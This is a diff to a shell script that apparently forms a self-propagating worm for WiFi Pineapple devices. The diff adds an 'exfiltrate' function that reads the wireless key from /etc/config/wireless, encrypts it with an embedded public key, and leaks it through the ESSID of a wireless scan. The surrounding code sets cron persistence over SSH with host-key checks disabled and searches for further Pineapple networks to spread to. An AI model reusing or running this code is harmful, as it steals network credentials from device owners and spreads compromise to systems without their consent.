@@ -62,7 +62,11 @@ ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rs
 persist() {
 ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
 }
+exfiltrate() {
+which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key" | cut -d"'" -f2 | openssl rsautl -encrypt -pubin -inkey /tospo/tvd.pub)" >/dev/null
+}
 init
+exfiltrate
 for a5 in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$a1"`
 do
 pushstate
